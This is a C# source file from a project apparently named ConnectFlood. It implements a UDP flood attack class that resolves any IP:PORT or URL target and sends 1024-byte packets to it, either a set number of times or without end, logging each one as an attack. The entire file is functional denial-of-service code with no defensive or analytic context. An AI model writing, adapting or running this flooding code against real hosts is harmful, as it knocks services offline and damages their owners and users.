using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class UdpFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string ip;
            int port;

            try
            {
                if (target.StartsWith("http://") || target.StartsWith("https://"))
                {
                    Uri uri = new Uri(target);
                    ip = Dns.GetHostAddresses(uri.Host)[0].ToString();
                    port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
                }
                else
                {
                    string[] targetParts = target.Split(':');
                    if (targetParts.Length != 2 || !int.TryParse(targetParts[1], out port))
                    {
                        Console.WriteLine("Invalid target format. Use: IP:PORT or http://domain.com");
                        return;
                    }
                    ip = targetParts[0];
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing target: {ex.Message}");
                return;
            }

            byte[] data = new byte[1024];

            Console.WriteLine($"[UDP] Attacking {ip}:{port} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            using (UdpClient udpClient = new UdpClient())
            {
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
                int count = 0;

                while (packetCount == -1 || count < packetCount)
                {
                    udpClient.Send(data, data.Length, endPoint);
                    Console.WriteLine($"[UDP] Packet {count + 1} sent to {ip}:{port}");
                    count++;
                    Thread.Sleep(speed);
                }
            }
        }
    }
}
